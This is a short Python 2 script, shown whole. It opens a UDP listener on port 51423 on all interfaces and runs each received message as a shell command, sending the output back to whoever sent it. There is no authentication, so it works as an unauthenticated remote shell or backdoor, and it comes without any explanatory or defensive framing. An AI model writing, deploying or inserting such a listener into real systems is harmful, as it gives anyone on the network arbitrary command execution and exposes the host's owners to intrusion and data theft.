import pysock,subprocess

host = ''
port = 51423
ser = pysock.new_server()
s = ser.open_UDP()
s.bind((host,port))

while True:
    try:
        print 'waiting for connection...'
        message,address = s.recvfrom(1024)
        print 'get code <%s> from %s'%(message,str(address))
        p = subprocess.Popen(message,
                             shell=True,
                             stdout = subprocess.PIPE,
                             stdin = subprocess.PIPE,
                             stderr = subprocess.STDOUT)
        STDOUT,STDERR = p.communicate()
        if STDOUT:
            s.sendto(STDOUT,address)
        else:
            print '0'
        
    except(IOError):
        pass
